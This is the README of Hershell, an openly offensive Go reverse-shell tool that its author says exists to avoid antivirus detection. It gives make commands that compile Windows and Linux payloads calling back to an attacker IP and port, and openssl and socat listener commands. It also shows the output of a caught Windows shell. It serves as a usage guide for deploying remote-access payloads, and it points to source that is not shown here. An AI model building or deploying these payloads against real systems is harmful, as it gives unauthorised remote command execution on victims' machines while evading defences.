# Hershell

Simple TCP reverse shell written in [Go](https://golang.org).

It uses TLS to secure the communications, and provide a certificate public key fingerprint pinning feature, preventing from traffic interception.

## Why ?

Although meterpreter payloads are great, they are sometimes spotted by AV products.

The goal of this project is to get a simple reverse shell, which can work on multiple systems,

## How ?

Since it's written in Go, you can cross compile the source for the desired architecture.

To simplify things, you can use the provided Makefile.
You can set the following environment variables:

- ``GOOS`` : the target OS
- ``GOARCH`` : the target architecture
- ``LHOST`` : the attacker IP or domain name
- ``LPORT`` : the listener port

For the ``GOOS`` and ``GOARCH`` variables, you can get the allowed values [here](https://golang.org/doc/install/source#environment).

However, some helper targets are available in the ``Makefile``:

- ``windows32`` : windows 32 bits executable
- ``windows64`` : windows 64 bits executable 
- ``linux32`` : linux 32 bits executable
- ``linux64`` : linux 64 bits executable

For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment variables.

## Examples

For windows:

```bash
# Custom target
$ make GOOS=windows GOARCH=amd64 LHOST=192.168.0.12 LPORT=1234
# Predifined target
$ make windows32 LHOST=192.168.0.12 LPORT=1234
```

For Linux:
```bash
# Custom target
$ make GOOS=linux GOARCH=amd64 LHOST=192.168.0.12 LPORT=1234
# Predifined target
$ make linux32 LHOST=192.168.0.12 LPORT=1234
```

On the server side, you can use the openssl integrated TLS server:

```bash
$ openssl s_server -cert server.pem -key server.key -accept 1234
Using default temp DH parameters
ACCEPT
bad gethostbyaddr
-----BEGIN SSL SESSION PARAMETERS-----
MHUCAQECAgMDBALALwQgsR3QwizJziqh4Ps3i+xHQKs9lvp5RfsYPWjEDB68Z4kE
MHnP0OD99CHv2u27THKvCHCggKEpgrPnKH+vNGJGPJZ42QylfkekhSwY5Mtr5qYI
5qEGAgRYgSfgogQCAgEspAYEBAEAAAA=
-----END SSL SESSION PARAMETERS-----
Shared ciphers:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA:ECDHE-RSA-DES-CBC3-SHA:DES-CBC3-SHA
Signature Algorithms: RSA+SHA256:ECDSA+SHA256:RSA+SHA384:ECDSA+SHA384:RSA+SHA1:ECDSA+SHA1
Shared Signature Algorithms: RSA+SHA256:ECDSA+SHA256:RSA+SHA384:ECDSA+SHA384:RSA+SHA1:ECDSA+SHA1
Supported Elliptic Curve Point Formats: uncompressed
Supported Elliptic Curves: P-256:P-384:P-521
Shared Elliptic curves: P-256:P-384:P-521
CIPHER is ECDHE-RSA-AES128-GCM-SHA256
Secure Renegotiation IS supported
Microsoft Windows [version 10.0.10586]
(c) 2015 Microsoft Corporation. Tous droits rservs.

C:\Users\LAB2\Downloads>
```

Or even better, use socat with its __readline__ module, which gives you a handy history feature:

```bash
$ socat readline openssl-listen:1234,fork,reuseaddr,verify=0,cert=server.pem
Microsoft Windows [version 10.0.10586]
(c) 2015 Microsoft Corporation. Tous droits rservs.

C:\Users\LAB2\Downloads>
```
